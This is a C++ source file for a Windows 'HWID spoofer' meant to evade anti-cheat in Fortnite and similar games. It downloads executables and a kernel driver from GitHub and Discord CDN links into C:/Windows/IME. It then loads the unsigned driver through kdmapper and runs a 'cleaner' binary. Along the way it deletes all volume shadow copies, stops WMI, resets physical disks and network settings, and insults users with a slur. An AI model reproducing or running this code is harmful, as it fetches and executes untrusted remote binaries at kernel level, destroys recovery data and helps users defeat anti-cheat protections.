#include <iostream>


#include <Windows.h>
#include <ios>
#include <limits>
#include <stdio.h>
#include <time.h>
#include <conio.h>
#include <sstream>
#include <string>
#include "CConsole.h"
#include <urlmon.h>
#include <tchar.h>
#include "xor.hpp"
#pragma comment (lib, "urlmon.lib")
/*
* Made by Fuzso
* Works on Fortnite.
* Put it Multi Byte, Release x64
* IMPORTANT it wont build if you dont do this: Go to Project at the top of ur screen then press properies and then go to C/C++ Optimization and Disable it
*/
//Made better by ritz#9999
//it works on all be and eac games

using namespace std;

void spoofdownload()
{
   
    HRESULT a = URLDownloadToFile(NULL, _T("https://raw.githubusercontent.com/HappyCatOfficial/LydianSpooferCracked/main/kdmappernew.exe"), _T("C:/Windows/IME/kdmapper.exe"), 0, NULL);
    HRESULT ab= URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/861637873233166406/862052796348760114/sppof.sys"), _T("C:/Windows/IME/Spoofy.sys"), 0, NULL);
   
}

void clean()
{
    HRESULT abc = URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/739807832865767495/764472006657572904/cleaner_protected.exe"), _T("C:/Windows/IME/applecleaner.exe"), 0, NULL);
    system("start C:/Windows/IME/applecleaner.exe");
}

int main()
{
    SetConsoleTitle(_T("SOFTCLUB-SPOOFER"));

    spoofdownload();
    system("taskkill /f /im EpicGamesLauncher.exe >nul 2>&1");
    system("taskkill /f /im FortniteClient-Win64-Shipping.exe >nul 2>&1");
    system("taskkill /f /im OneDrive.exe >nul 2>&1");
    system("taskkill /f /im RustClient.exe >nul 2>&1");
    system("taskkill /f /im Origin.exe >nul 2>&1");
    system("taskkill /f /im r5apex.exe >nul 2>&1");
    system("color 0D");
   CConsole::Clear();
    CConsole::MakeSexy();
   // CConsole::SetRandomTitle();
    CConsole::Print("Welcome ");
    Sleep(800);
    CConsole::Print("to ");
    Sleep(800);
    CConsole::Print("SOFTCLUB-SPOOFER");
    Sleep(800);
    CConsole::Print("!");
    // spoofer working all windows versoins
	Sleep(5000);
	CConsole::Clear();
    CConsole::Print("Beginning spoofing process in 3\n");
    Sleep(1000);
    CConsole::Clear();
    CConsole::Print("Beginning spoofing process in 2\n");
    Sleep(1000);
    CConsole::Clear();
    CConsole::Print("Beginning spoofing process in 1\n");
    Sleep(1000);
    CConsole::Clear();
    CConsole::Print("Spoofing CPU,RAM,BIOS,Motherboard...\n");
   
	system("powershell.exe  Reset-PhysicalDisk * >nul 2>&1");
	CConsole::Clear();
    CConsole::Print("Spoofing Adapters and MAC Address...\n");
	Sleep(2500);
    
    system("NETSH WINSOCK RESET");
    system("NETSH INT IP RESET");
    system("NETSH INTERFACE IPV4 RESET");
    system("NETSH INTERFACE IPV6 RESET");
    system("NETSH INTERFACE TCP RESET");
    system("IPCONFIG /RELEASE");
    system("IPCONFIG /RELEASE");
    system("IPCONFIG /RENEW");
    system("IPCONFIG /FLUSHDNS");
    system("IPCONFIG /RENEW");
    system("net stop winmgmt /y >nul 2>&1");
    system("vssadmin delete shadows /All /Quiet >nul 2>&1");
   CConsole::Clear();
   CConsole::Print("Spoofing Diskdrive...\n");
   CConsole::Print("Old SerialNumber\n");
   system(("wmic diskdrive get serialnumber"));
   system("start C:/Windows/IME/kdmapper.exe C:/Windows/IME/Spoofy.sys");
   Sleep(1500);
   CConsole::Print("New SerialNumber\n");
   system(("wmic diskdrive get serialnumber"));
   CConsole::Print("hwid nullified!\n");
   CConsole::Print("Spoof Success!\n");
   Sleep(6000);
   CConsole::Clear();
    CConsole::Print("Would You Like To Run Apple Cleaner? [y or n]\n");

    std::string input;
    std::getline(std::cin, input);

    while (input != "y" && input != "n" && input != "Y" && input != "N") {
        std::cout << "ur so fucking retarted\n\n";
        CConsole::Print("Press any key to exit...\n");
        CConsole::Pause();

       
    }
    if (input == "y")
    {
        clean();
    }
    else if (input == "n")
    {
        CConsole::Clear();
        CConsole::Print("Press any key to exit...\n");
        CConsole::Pause();
    }
	
	
	


}

